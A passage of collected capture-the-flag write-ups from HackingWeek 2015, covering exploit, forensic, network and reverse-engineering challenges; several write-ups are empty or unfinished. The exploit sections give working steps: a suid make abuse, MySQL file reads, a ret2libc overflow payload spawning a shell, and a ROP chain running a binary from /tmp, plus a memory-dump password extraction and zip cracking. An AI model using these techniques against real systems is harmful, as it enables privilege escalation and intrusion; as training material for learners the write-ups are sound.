> Connectez-vous en tant que <code>guest</code> (mot de passe: <code>shu1eKoo</code>) sur la machine <code>37.187.22.21</code>.<br>
> Vous trouverez la clef de validation cachée dans le fichier <code>/home/exploit03/.secret</code>.
>
> ```
> $> ssh guest@37.187.22.21
> ```

___

## Write-up

This task is an exploit task.  
We are given a shell on a remote server.  
The source code is also given. It is make version 3.81-alpha.  
This version is vulnerable to a vulnerability.  
The "intended" way to solve this task will not be described here, because
there was an other vulnerability everyone took advantage of.  
If you are looking for the "correct" way of solving this, check exploit 05.  

There was a suid binary of GNU Make 3.81, that you could use to compile every
Makefile.  
It was therefore possible to run any command from user exploit03 with a  
crafted Makefile dropped in /tmp/:

```Makefile
all:
        @whoami
        @cat /home/exploit03/.secret
```
`/home/exploit03/project/make -f exploit-03`

> exploit03  
> uY2Waed3ie	

**Flag**: uY2Waed3ie



### File: WU-2015/hackingweek-2015/exploit/exploit4/README.md

# HackingWeek CTF 2015: Exploit 4

**Category:** exploit |
**Points:** 4816 |
**Solves:** 31 |
**Description:**

> Connectez-vous en tant que <code>guest</code> (mot de passe: <code>shu1eKoo</code>) sur la machine <code>37.187.22.21</code>.<br>
> Vous trouverez la clef de validation cachée dans le fichier <code>/home/exploit04/.secret</code>.
>
> ```
> $> ssh guest@37.187.22.21
> ```

___

## Write-up

This task is an exploit task.  
We are given a shell on a remote server.  
We are also given a MySQL user who has every rights.  
This was not intended at first, hence the exploit 06.  

> mysql> `USE test;`
> Reading table information for completion of table and column names  
> You can turn off this feature to get a quicker startup with -A
>  
> Database changed  
> mysql> `CREATE TABLE XeR(flag VARCHAR(255));`  
> Query OK, 0 rows affected (0.09 sec)  
> 
> mysql> `LOAD DATA INFILE '/home/exploit04/.secret' INTO TABLE XeR;`  
> Query OK, 1 row affected (0.05 sec)  
> Records: 1  Deleted: 0  Skipped: 0  Warnings: 0  
> 
> mysql> `SELECT * FROM XeR;`  
> ```
> +------------+
> | flag       |
> +------------+
> | xaeVu9oot1 |
> +------------+
> ```
> 
> 1 row in set (0.00 sec)  
>
> mysql> `DROP TABLE XeR;`  
> Query OK, 0 rows affected (0.06 sec)  

**Flag**: xaeVu9oot1

Bonus:

> mysql> SELECT USER();  
```
+----------------+
| USER()         |
+----------------+
| root@localhost |
+----------------+
```
> 1 row in set (0.00 sec)



### File: WU-2015/hackingweek-2015/exploit/exploit5/README.md

# HackingWeek CTF 2015: Exploit 5
i
**Category:** exploit |
**Points:** 6106 |
**Solves:** 16 |
**Description:**

> Connectez-vous en tant que <code>guest</code> (mot de passe: <code>shu1eKoo</code>) sur la machine <code>37.187.22.21</code>.<br>
> Vous trouverez la clef de validation cachée dans le fichier <code>/home/exploit05/.secret</code>.
>
> ```
> $> ssh guest@37.187.22.21
> ```

___

## Write-up
 

For this exploit05, we have the package `make 3.81`, which is vulnerable to an heap-overflow (cf : https://www.exploit-db.com/exploits/34164/), and `safe-run` (suid binary that launch make).<br>
We'll use this one to try the heap overflow :


```bash
guest@ns314076:/home/exploit05/project$ ./safe-run $(python -c 'print "A"*4000 + "B"*96 + "CCCC" * 4')

make: stat: /home/exploit05/project/AAAAAA...AAAABBBBB...BBBBCCCCCCCCCCCCCCC: File name too long
Segmentation fault
```
<br>

Nice, let's analyse this segfault in GDB :

```bash
guest@ns314076:/home/exploit05/project$ gdb -q -ex "source /tmp/kaluche/peda/peda.py" --args safe-run
gdb-peda$ r $(python -c 'print "A"*4000 + "B"*96 + "CCCC" * 4')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x43434343 ('CCCC')
ECX: 0x2f2f2f2f ('////')
EDX: 0x2f2f ('//')
ESI: 0x43434343 ('CCCC')
EDI: 0xbfff6b10 --> 0xbfff7dd4 --> 0x80811c8 ("/home/exploit05/project/", 'A' <repeats 176 times>...)
EBP: 0xbfff6aa8 --> 0xbfff8df8 --> 0xbfffb148 --> 0xbfffd488 --> 0x0 
ESP: 0xbfff6a54 --> 0x792e ('.y')
EIP: 0xb7ee54d2 (<strrchr+34>:	mov    dl,BYTE PTR [esi])
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
```
<br>

Ok, we don't control EIP :'(<br>
After some tries, i finally get this : 


```
gdb-peda$ r $(python -c 'print "A"*4000 + "B"*124 + "C" * 4')
...
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x42424242 ('BBBB')
ECX: 0x807feb8 --> 0x160 
EDX: 0x807ff98 --> 0x732e ('.s')
ESI: 0x42424242 ('BBBB')
EDI: 0x42424242 ('BBBB')
EBP: 0x42424242 ('BBBB')
ESP: 0xbfff6400 --> 0x792e ('.y')
EIP: 0x43434343 ('CCCC')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x43434343
[------------------------------------stack-------------------------------------]
0000| 0xbfff6400 --> 0x792e ('.y')
0004| 0xbfff6404 --> 0x0 
0008| 0xbfff6408 --> 0xbfff6458 --> 0x0 
0012| 0xbfff640c --> 0x8084cb8 ('A' <repeats 200 times>...)
0016| 0xbfff6410 --> 0x8084cb8 ('A' <repeats 200 times>...)
0020| 0xbfff6414 --> 0x0 
0024| 0xbfff6418 --> 0x0 
0028| 0xbfff641c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
** 0x43434343 in ?? () **
```
<br>

EIP is now controlled !<br>
Let's see what protection are enabled :

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
gdb-peda$ aslr
ASLR is OFF
gdb-peda$ 

```
<br>

So we only need to bypass NX.<br>
To do this, we will store `sh ;` in our buffer, change EIP with the address of `system`, add JUNK bytes, and add the address of our buffer.<br>
Here we go :

```
gdb-peda$ r $(python -c 'print "sh;".ljust(4000,"A") + "B"*124 + "C"*4')
Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()

gdb-peda$ x system
0xb7ea8c30 <system>:	0x890cec83
```
<br>

__SYSTEM > \x30\x8c\xea\xb7__

```
Stopped reason: SIGSEGV
0x43434343 in ?? ()
gdb-peda$ searchmem sh;
Searching for 'sh;' in: None ranges
Found 16 results, display max 16 items:
 [heap] : 0x8077958 ("sh;", 'A' <repeats 197 times>...)
 [heap] : 0x80799e8 ("sh;", 'A' <repeats 197 times>...)
 [heap] : 0x807f1c0 ("sh;", 'A' <repeats 197 times>...)
 [heap] : 0x8080200 ("sh;", 'A' <repeats 197 times>...)
 [heap] : 0x8081240 ("sh;", 'A' <repeats 197 times>...)
 [heap] : 0x808329f ("sh;", 'A' <repeats 197 times>...)
 [heap] : 0x80842e7 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfff4967 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfff5a50 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfff6cc0 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfff7db0 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfff9020 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfffa110 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfffb380 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfffc460 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfffefbe ("sh;", 'A' <repeats 197 times>...)
gdb-peda$ 
```
<br><br>

__BUFFER « sh ; » ADDRESS >  \x58\x79\x07\x08__

We got all we need !<br>
Let's go :

```bash
guest@ns314076:/home/exploit05/project$ ./safe-run $(python -c 'print "sh;".ljust(4000,"A") + "B"*124 + "\x30\x8c\xea\xb7" + "JUNK" + "\x58\x79\x07\x08"')
…
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB0���JUNKX: File name too long
sh-4.2$ id
uid=1000(guest) gid=1000(guest) euid=1005(exploit05) egid=1005(exploit05) groups=1005(exploit05),1000(guest)
sh-4.2$ whoami
exploit05
sh-4.2$ cd /home/exploit05/
sh-4.2$ cat .secret
EiN5ohqu5Ush-4.2$ 
```

__FLAG__: EiN5ohqu5U

And thx to RageYL for the help ;)

Enjoy,<br>
\- [Elkaluche](https://twitter.com/Elkaluche)



### File: WU-2015/hackingweek-2015/exploit/exploit6/README.md

# HackingWeek CTF 2015: Exploit 6

**Category:** exploit |
**Points:** 7224 |
**Solves:** 3 |
**Description:**

> Connectez-vous en tant que <code>guest</code> (mot de passe: <code>shu1eKoo</code>) sur la machine <code>37.187.22.21</code>.<br>
> Vous trouverez la clef de validation cachée dans le fichier <code>/home/exploit06/.secret</code>.
>
> ```
> $> ssh guest@37.187.22.21
> ```

___

## Write-up

This task is an exploit task.  
We are given a shell on a remote server.  
The source code is also given. It is MySQL version 5.5.19.  
This version is vulnerable to several CVE.
(like... [a lot](http://www.cvedetails.com/vulnerability-list.php?vendor_id=93&product_id=21801&version_id=120498).)

There are two interesting PoC by kingcope :
- [CVE-2012-5611](http://www.cvedetails.com/cve/CVE-2012-5611/)
- [CVE-2012-5612](http://www.cvedetails.com/cve/CVE-2012-5612/).

Everyone started working on the heap overflow, because the account we had did
not have GRANT rights.  
It seems to me that the heap overflow cannot be exploited.

Even though we did not have GRANT rights, it was possible to trigger a
segfault with a large string such as :
```SQL
GRANT ALL ON `AAA...`.* TO yolo`
```

The binary is in remote, with non-exec stack, so ret2libc will work,
but is not possible because of the limitations of this exploit : table names
are in UTF-8, which means you get an error when you send wrong UTF-8
characters. (system is at 0xb7ea8c30 which is not valid.)

However, there is still a way to pwn it : return-oriented programming.  
ROP, works just like ret2libc. In fact, I see it as an evolution of ret2libc
attacks : instead of jumping to functions, you jump to part of code before
the end of a function.

Let's take an example :
```C
int foo(int x)
{
	int y = x;

	y *= 1337;
	y += 32;
	
	return y;
}
```
This function obviously returns `y = 1337 * x + 32`.

It is possible for us to jump in the middle of the function, right before the y += 32 line. It will increase one of our register by 32, and return it.
This is what we call a gadget, and ROP is putting together several gadgets to "recode" a shellcode with already-existing instructions.
Note that it is also possible to find gadgets that were not intended by the programmer : you cannot write "saltwater" without writing "twat".

Finding every gadgets by hand would be REALLY long, that's why there are software to make this task quicker.
I used the excellent rp++ by 0vercl0k to get every gadgets.

> Trying to open 'mysql-5.5.19-linux2.6-i686/bin/mysqld'..
> Loading ELF information..
> FileFormat: Elf, Arch: Ia32
> Using the Nasm syntax..
>
> Wait a few seconds, rp++ is looking for gadgets..
> in PHDR
> 0 found.
>
> in LOAD
> 679776 found.
>
> A total of 679776 gadgets found.

There is a lot of gadgets, but unfortunately, most of them were useless,
because MySQL only allows UTF-8 table names.
It means that we either have to be EXTREMLY lucky, or simply drop every
gadgets where one of the address's byte & 0x80 != 0.  
I picked the later.

We tried to call the execve syscall, with a binary from /tmp.  
Let's call it "hax" to get an 8-letters path (2 * 32 bits)  
> Call a syscall : INT 0x80  
> eax = syscall number (Here 0x0B for execve)  
> ebx = 1st argument (here "/tmp/hax")  
> ecx = 2nd argument (here {"/bin/hax", NULL})  
> edx = 3rd argument (here {NULL})  

By cherry-picking gadgets, we found some interesting gadgets :
```ASM
0x08052960: ret  ;  (1 found)
0x082a1579: pop eax ; ret  ;  (1 found)
0x08442908: xchg eax, ebp ; ret  ;  (1 found)
0x087f052d: xchg eax, ebx ; ret  ;  (1 found)
0x084e3456: xchg eax, ecx ; ret  ;  (1 found)
0x08240d14: xchg eax, edi ; ret  ;  (1 found)
0x084e3062: xchg eax, edx ; ret  ;  (1 found)
0x08190c2a: mov dword [eax], edx ; pop ebp ; ret  ;  (1 found)
0x0838733a: add eax, 0x01 ; ret  ;  (1 found)
0x0838484f: int 0x80 ;  (1 found)
```

With those gadgets, we can do almost anything we want :
first, pop eax which will pop next stack's value to eax, then xchg with an
other register to load "any" value to a register.  
We also needed a gadget to write a value to an address, to store our
"/tmp/hax" string.

Our sequence is :
```
popeax,   "/tmp"
xchgedx,
popeax,   0x09103030, // write it to 0x09103030
writeeax, 0x09103034, // pops ebp

// Write /hax to 0x09103034
popeax,   "/hax"
xchgedx,
xchgebp,
writeeax, 0x0910303C,

// Write address of "/tmp/hax" to 0x0910303C
popeax,   0x09103030,
xchgedx,
xchgebp,
writeeax, 0x09103040,

/*
 x86 syscalls :
 eax = syscall # (0x0B == execve)
 ebx = param 1
 ecx = param 2
 edx = param 3
*/

popeax, 0x09103030,
xchgebx,            // ebx = "/tmp/hax"

popeax, 0x0910303C, 
xchgecx,            // ecx = {"/tmp/hax", NULL}

popeax, 0x09103040, // pointer to NULL
xchgedx,            // envp = {NULL}

xchgedi, // edi seems to be always 0. Who care if it's true ? It's a CTF !
// 0 + 11 * 1
addeax,
addeax,
addeax,
addeax,
addeax,
addeax,
addeax,
addeax,
addeax,
addeax,
addeax,

syscall
```

Once the exploit works, there are still a few things to settle, before being
able to get the flag :  
* port 3307 is filtered by a firewall.
  * Use SSH to forward a port :
  * ssh -L 54321:127.0.0.1:3342 guest@37.187.22.21
* What do we put in hax ?
  * What about a [reverse shell](shell.c) ? :)

> `whoami; cat ../../.secret`  
> exploit06  
> Ahpheod2ij

[Final exploit (PHP)](poc.php)  
**Flag**: Ahpheod2ij

PS: At first, we wanted to spawn a reverse shell, but heh, at least, it worked,
right ? :P 



### File: WU-2015/hackingweek-2015/forensic/forensic1/README.md

# HackingWeen CTF 2015: Forensic 1

**Category:** forensic | 
**Points:** 2580 |
**Solves:** 58 |
**Description:**


> L'image mémoire fournie a été capturée sur une machine compromise à vous de l'analyser pour répondre aux questions (il s'agit de la même image pour les quatre épreuves de forensic, inutile de la télécharger plusieurs fois).<br>
> <br>
> Pour obtenir la clef de validation de cette épreuve est donnée par le PID, le PPID et le nombre de threads du programme <code>Solitaire</code>. Mettez-le au format suivant <code>PID:PPID:nThreads</code>.
> 
> * `dump.gz` (md5sum:1273931ce359f59bce95ce4507e1f4bf)


___

## Write-up

This task was quite simple :<br>
```bash
vol -f /root/Téléchargements/hackweek/dump --profile=Win7SP1x86 pslist | grep Solitaire | awk '{printf("%d:%d:%d\n",$3,$4,$5)}'
```
<br>
_Output_: 
```
Volatility Foundation Volatility Framework 2.3.1
2992:1312:8
```

__Flag__: `2992:1312:8`
<br>
Enjoy,<br>
\- [Rawger](https://twitter.com/_rawger)



### File: WU-2015/hackingweek-2015/forensic/forensic2/README.md

# HackingWeek CTF 2015: Forensic 2

**Category:** forensic |
**Points:** 3440 |
**Solves:** 48 |
**Description:**


> L'image mémoire fournie a été capturée sur une machine compromise à vous de l'analyser pour répondre aux questions (il s'agit de la même image pour les quatre épreuves de forensic, inutile de la télécharger plusieurs fois).<br>
> <br> 
> L'un des utilisateurs de la machine venait de consulter plusieurs sites Web à propos d'un incident qui impliquait une personnalité de showbiz. La clef de validation est le <code>PrenomNom</code> de cette personnalité.
> 
> * <code>dump.gz</code> (md5sum:1273931ce359f59bce95ce4507e1f4bf)


___

## Write-up

This task was also quite easy, here is my oneliner :<br>
```bash
strings dump | grep "actu"
 
; String0 = CPUManufacturer ,  Numeric0 = Unused.
; Sometimes the BIOS does not report the memory it is actually using.
; String Args: (CPUManufacturer, Op, Op, Op)
; String Args: (CPUManufacturer, CPUFamilyOp, CPUModelOp, CPUSteppingOp,
; String Args: (CPUManufacturer, Op, Op, Op)
Previous packet was actually BOOTP!
A       https://fr.cinema.yahoo.com/actualite/crash-avion-harrison-ford-blesse-070221[...]
 
HarrisonFord
```
<br>
__Flag__: `HarrisonFord`
<br>
Enjoy,<br>
\- [Rawger](https://twitter.com/_rawger) 



### File: WU-2015/hackingweek-2015/forensic/forensic3/README.md

# HackingWeek CTF 2015: Forensic 3

**Category:** forensic |
**Points:** 4300 |
**Solves:** 37 |
**Description:**

> L'image mémoire fournie a été capturée sur une machine compromise à vous de l'analyser pour répondre aux questions (il s'agit de la même image pour les quatre épreuves de forensic, inutile de la télécharger plusieurs fois).<br>
> <br> 
> Trouvez le mot de passe de l'utilisateur <code>admin</code> qui se trouve quelque part en mémoire.
> 
> * <code>dump.gz</code> (md5sum:1273931ce359f59bce95ce4507e1f4bf)

___

## Write-up

I fount the method Wdiget here :
http://articles.forensicfocus.com/2014/04/28/windows-logon-password-get-windows-logon-password-using-wdigest-in-memory-dump/

```bash
$ vol -f /root/Téléchargements/hackweek/dump --profile=Win7SP1x86 logon
 
Volatility Foundation Volatility Framework 2.3.1
[!] lsass.exe(480) dump start!
[!] lsass.exe(480) dump is complete!
[!] wdigest.dll dump start!
[!] wdigest.dll dump is complete!
[!] lsasrv.dll dump start!
[!] lsasrv.dll dump is complete!
[!] lsass.exe(480) memmap dump start!
[!] lsass.exe(480) memmap dump is complete!
 
[!] Encrypt type is <3DES>
[!] Password decrypt success!
 
[=] Username :  admin
[=] Password :  cV[5g@2I
```
<br>
__Flag__: `cV[5g@2I`
<br>
Enjoy,<br>
\- [Rawger](https://twitter.com/_rawger)



### File: WU-2015/hackingweek-2015/forensic/forensic4/README.md

# HackingWeek CTF 2015: Forensic 4

**Category:** forensic |
**Points:** 5160 |
**Solves:** 27 |
**Description:**


> L'image mémoire fournie a été capturée sur une machine compromise à vous de l'analyser pour répondre aux questions (il s'agit de la même image pour les quatre épreuves de forensic, inutile de la télécharger plusieurs fois).<br>
> <br> 
> Lors de la compromission de la machine, l'attaquant a installé un logiciel de Command & Control qui est inactif pour le moment mais qui doit contacter un serveur pour recevoir ses ordres. Trouvez le nom du serveur et le port sur lequel le malware doit se connecter. La clef de validation sera servername:portnumber.
> 
> * <code>dump.gz</code> (md5sum:1273931ce359f59bce95ce4507e1f4bf)

___

## Write-up




### File: WU-2015/hackingweek-2015/net/net1/README.md

# HackingWeek CTF 2015: Net 1

**Category:** net |
**Points:** 1032 |
**Solves:** 75 |
**Description:**

> Le fichier `pcap` suivant contient une capture réseau d'une connexion FTP. La clef de ce challenge est contenu dans l'un des fichiers transférés pendant cette connexion FTP.
> * [ftp.pcap](http://hackingweek.fr/media/Aa0eiHuu/ftp.pcap)

___

## Write-up




### File: WU-2015/hackingweek-2015/net/net2/README.md

# HackingWeek CTF 2015: Net 2

**Category:** net |
**Points:** 1720 |
**Solves:** 67 |
**Description:**



> Le fichier `pcap` suivant contient une capture réseau d'un scan `nmap`, retrouvez les services qui ont été trouvés sur la machine cible. La clef de validation sera `service1:service2:service3:...` en mettant les services par ordre de ports croissants.
> 
> * [nmap-scan.pcap](http://hackingweek.fr/media/Aa0eiHuu/nmap-scan.pcap)

___

## Write-up

This challenge was fun but quite simple.

Indeed, when a service is enable on a machine, the host replies SYN/ACK to a SYN. That is the `three-way handshake`.

![Alt text](http://www.georgecoding.com/wp-content/uploads/2013/04/handshake.gif)

Knowing that, it's easy to output using tshark all the SYN/ACK received !

Here is my code :

```bash
$ tshark -r nmap-scan.pcap | awk  '/\[SYN, ACK\]/{print $8}'
```
<br>
So, to have the expected answer, using `/etc/services`
```bash
$ for PORT in $(tshark -r nmap-scan.pcap | awk  '/\[SYN, ACK\]/{print $8}'|sort -n); do 
> awk '/\t'"${PORT%→*}"'\/tcp/{printf "%s:", $1}' /etc/services
> done
ftp:ssh:telnet:http:https:
```
<br>
Pwned.

__Flag__: ftp:ssh:telnet:http:https

Enjoy,<br>
\- [Notfound](http://www.notfound.ovh)



### File: WU-2015/hackingweek-2015/net/net3/README.md

# HackingWeek CTF 2015: Net 3

**Category:** net |
**Points:** 3784 |
**Solves:** 43 |
**Description:**


> Le fichier `pcap` suivant contient une capture réseau d'un transfert via le protocole SMB2. Il s'agit de retrouver un fichier zippé qui transité sur le réseau et d'en extraire la clef qu'il contient.
> 
> * [smb-capture.pcap.gz](http://hackingweek.fr/media/Aa0eiHuu/smb-capture.pcap.gz)

___

## Write-up

For this challenge, it was written that we had to find a zipped file.<br>
The first thing I did was to use foremost searching for .zip :

```bash
$ foremost -t zip smb-capture.pcap
Processing: smb-capture.pcap
|foundat=secret/
foundat=secret/flag.txt
```
<br><br>
Well, foremost have found some .zip, let's see.

```bash
$ ls output/zip/
00007967.zip  00007968.zip  00028015.zip  00028131.zip  00029940.zip  00029941.zip  00077631.zip  00079582.zip  00079583.zip
```
<br><br>
When I tried to unzip one, I had this output :

```bash
unzip 00007967.zip 
Archive:  00007967.zip
   skipping: secret/flag.txt         need PK compat. v5.1 (can do v4.6)
   creating: secret/
```
<br><br>
This is because two things :
- The file is password-protected.
- The zipped file is a 7z.

```bash
$ 7z e 00007967.zip

7-Zip 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=fr_FR.utf8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: 00007967.zip

Extracting  secret
Extracting  secret/flag.txt
Enter password (will not be echoed) : the_game
     Data Error in encrypted file. Wrong password?

Sub items Errors: 1
```
<br><br>

Hm, we need to find the password.<br>
I did the bruteforce using john2zip and john :

```bash
$ zip2john 00007967.zip
00007967.zip->secret/ is not encrypted!
00007967.zip->secret/flag.txt is using AES encryption, extrafield_length is 11
00007967.zip:$zip$*0*1*a2b728db72200be0*a089

$ echo '$zip$*0*1*a2b728db72200be0*a089' > pass
$ john pass 
Loaded 1 password hash (WinZip PBKDF2-HMAC-SHA-1 [32/32])
dawn             (?)
```
<br><br>

Oh, a possible password ... Let's try it : 
```bash
7z e 00007967.zip -pdawn

7-Zip 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=fr_FR.utf8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: 00007967.zip

Extracting  secret
Extracting  secret/flag.txt

Everything is Ok

Folders: 1
Files: 1
Size:       25
Compressed: 296
```
<br><br>

All seem good. 

```bash
cat flag.txt 
Le flag est : AsHTwn1xw2
```
<br><br>

Pwned.
<br>
__Flag__: AsHTwn1xw2
<br>
Enjoy,<br>
\- [Notfound](http://www.notfound.ovh)



### File: WU-2015/hackingweek-2015/net/net4/README.md

# HackingWeek CTF 2015: Net 4

**Category:** net |
**Points:** 4644 |
**Solves:** 33 |
**Description:**


> On dispose d'un fichier (`pcapssl-capture.pcap`), de la clef publique du serveur Web (`PublicKey.pem`), ainsi que du résultat d'une attaque Heartbleed sur le serveur pendant que l'échange se passait (`heartbleed_attack.log`).
> 
> Avec ces trois éléments, vous devez réussir à déchiffrer l'échange qui a eut lieu. La clef de validation de l'épreuve est le mot de passe de l'utilisateur qui se connecte pendant cet échange chiffré.
> 
> * [ssl-capture.pcap](http://hackingweek.fr/media/Aa0eiHuu/ssl-capture.pcap)
> * [PublicKey.pem](http://hackingweek.fr/media/Aa0eiHuu/PublicKey.pem)
> * [heartbleed_attack.log](http://hackingweek.fr/media/Aa0eiHuu/heartbleed_attack.log)


___

This challenge was really fun, here is the step to solve it.

- _Look at the PublicKey.pem_ :

## Write-up

```bash
$ openssl x509 -in PublicKey.pem -text -noout -modulus 
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            c0:35:60:84:36:24:b5:c3
    Signature Algorithm: sha1WithRSAEncryption
        Issuer: CN=ubuntu  <== LEL
//...//
Modulus=A9F1901F0A1E2CBCF8C79E9B37A73A32A67A6A525A11B78C4FF30293491C68C43AEA7FE9E60A50C32EE55640D2B21737E1EC4786982A903D41B684A79C03BE5B67B9FA6CEF65C3733C7764F86D4C38020B88695E59E62FAE1D095E22553B14F557B2968AAD3BCB0379C622F58A7478D3DFD9A5E22BD069B1E55538586ECBD23A6A0B4B2AE9E317FD4D328AF0638E999EC5B6EEA54E4DBEE30B39AD36AB35E929A49F411DF38367719AF2BD637802685CE2D9C0076567545287736BE5B51E28B1E8643E7495708878AECC07394C5A8A0BC74D68AF9CEBE40931BAFF70CEF00065740DBCCC978071AA5325A56A7A9F8244B5526EE72E2DFD32C70E45597A965D2B
```
<br><br>

Moreover, in the `heartbleed_attack.log`, we have a long interesting hexadecimal string :
```
DC05DF2DA2234A7635AAB34E3835C8DE6D63C01EF26BBC40CD9789A6DEC847A9EF505091A83085AEB63FDA003B4B07F69EADC779090E019C2B9D5008BF564DDE80EE7889D2B33F8D38C0F9E503C35769E3A0DDB7EED4617F4D82BAD877B7BC1016B631270944669C7BF221FD8FDB8B05B9DAB289F18F44F75C360E88938A2ECD
```
<br>
Converted to decimal : 
```
154505360461616922248064634925887787698458246382581570008454841098205176362058153054716586584864800572253287936092439749949400519549787548103712618564774866592690729105816373428201915463608923143735621932793997654468908714003299258111612018699395021710536083706990861285242484886738208843067246867876336512717
```

Let's see if this bigint divided le modulus in the `PublicKey` :
```
>>> 154505360461616922248064634925887787698458246382581570008454841098205176362058153054716586584864800572253287936092439749949400519549787548103712618564774866592690729105816373428201915463608923143735621932793997654468908714003299258111612018699395021710536083706990861285242484886738208843067246867876336512717 * (0xA9F1901F0A1E2CBCF8C79E9B37A73A32A67A6A525A11B78C4FF30293491C68C43AEA7FE9E60A50C32EE55640D2B21737E1EC4786982A903D41B684A79C03BE5B67B9FA6CEF65C3733C7764F86D4C38020B88695E59E62FAE1D095E22553B14F557B2968AAD3BCB0379C622F58A7478D3DFD9A5E22BD069B1E55538586ECBD23A6A0B4B2AE9E317FD4D328AF0638E999EC5B6EEA54E4DBEE30B39AD36AB35E929A49F411DF38367719AF2BD637802685CE2D9C0076567545287736BE5B51E28B1E8643E7495708878AECC07394C5A8A0BC74D68AF9CEBE40931BAFF70CEF00065740DBCCC978071AA5325A56A7A9F8244B5526EE72E2DFD32C70E45597A965D2B / 154505360461616922248064634925887787698458246382581570008454841098205176362058153054716586584864800572253287936092439749949400519549787548103712618564774866592690729105816373428201915463608923143735621932793997654468908714003299258111612018699395021710536083706990861285242484886738208843067246867876336512717) == 0xA9F1901F0A1E2CBCF8C79E9B37A73A32A67A6A525A11B78C4FF30293491C68C43AEA7FE9E60A50C32EE55640D2B21737E1EC4786982A903D41B684A79C03BE5B67B9FA6CEF65C3733C7764F86D4C38020B88695E59E62FAE1D095E22553B14F557B2968AAD3BCB0379C622F58A7478D3DFD9A5E22BD069B1E55538586ECBD23A6A0B4B2AE9E317FD4D328AF0638E999EC5B6EEA54E4DBEE30B39AD36AB35E929A49F411DF38367719AF2BD637802685CE2D9C0076567545287736BE5B51E28B1E8643E7495708878AECC07394C5A8A0BC74D68AF9CEBE40931BAFF70CEF00065740DBCCC978071AA5325A56A7A9F8244B5526EE72E2DFD32C70E45597A965D2B
True
```
<br><br>

Well, now I have `p` and `q` I can reconstruct the privatekey easily.

```
tofinish
```




### File: WU-2015/hackingweek-2015/reverse/reverse1/README.md

# HackingWeek CTF 2015: Reverse 1

**Category:** reverse |
**Points:** 2322 |
**Solves:** 60 |
**Description:**


> Le clef est le mot de passe du programme Linux suivant:
> 
> * [crackme](http://hackingweek.fr/media/Aa0eiHuu/crackme-01)

___

## Write-up

* First step : Let's have a look with gdb.
```
=> 0x804849f:   cmp    ebx,0xd
   0x80484a2:   je     0x80484d2
```

Well, `0xd => 13` so the expected `len()` for the password is `12 + '\n'`.

* Second step : Give a 12-length password.

```
$ ltrace ./crackme-01
fwrite("Welcome to this crackme !!!\n\nPas"..., 1, 39, 0xb7728ac0Welcome to this crackme !!!
...
getline(0xbfb3cc28, 0xbfb3cc2c, 0xb7728c20, 0xb7728ac0Password: thegame_____
...
fprintf(0xb7728ac0, "thegame_____\n"thegame_____
...
strncmp("oy-aiG", "thegame_____\n", 6)
```
<br>
Okay, the first part is `oy-aiG`.

```
$ ltrace ./crackme-01 
fwrite("Welcome to this crackme !!!\n\nPas"..., 1, 39, 0xb777eac0Welcome to this crackme !!!
...
getline(0xbf97f418, 0xbf97f41c, 0xb777ec20, 0xb777eac0Password: oy-aiGthegam
...
fprintf(0xb777eac0, "oy-aiGthegam\n"oy-aiGthegam
...
strncmp("oy-aiG", "oy-aiGthegam\n", 6)
strncmp("thegam\n", "\\xu8Ae", 6)
```

The second part is compared with `\xu8Ae`.
The password must be `oy-aiG || \xu8Ae`.

Let's try this :

```
./crackme-01 
Welcome to this crackme !!!

Password: oy-aiG\xu8Ae
oy-aiG\xu8Ae
Excellent, you succeed !
```
<br>
__Flag__: `oy-aiG\xu8Ae`
<br>
Enjoy,<br>
\- [Notfound](http://www.notfound.ovh)



### File: WU-2015/hackingweek-2015/reverse/reverse2/README.md

# HackingWeek CTF 2015: Reverse 2

**Category:** reverse |
**Points:** 4472 |
**Solves:** 35 |
**Description:**


> Le clef est le mot de passe du programme Linux suivant:
> 
> * [crackme](http://hackingweek.fr/media/Aa0eiHuu/crackme-02)

___

## Write-up



### File: WU-2015/hackingweek-2015/reverse/reverse3/README.md

# HackingWeek CTF 2015: Reverse 3

**Category:** reverse |
**Points:** 5590 |
**Solves:** 22 |
**Description:**

> Le clef est le mot de passe du programme Linux suivant:
> 
> * [crackme](http://hackingweek.fr/media/Aa0eiHuu/crackme-03)

___

## Write-up



### File: WU-2015/hackingweek-2015/reverse/reverse4/README.md

# HackingWeek CTF 2015: Reverse 4

**Category:** reverse |
**Points:** 6450 |
**Solves:** 11 |
**Description:**


> Le clef est le mot de passe du programme Linux suivant:
> 
> * [crackme](http://hackingweek.fr/media/Aa0eiHuu/crackme-04)
> 
> __Indices__:
> 
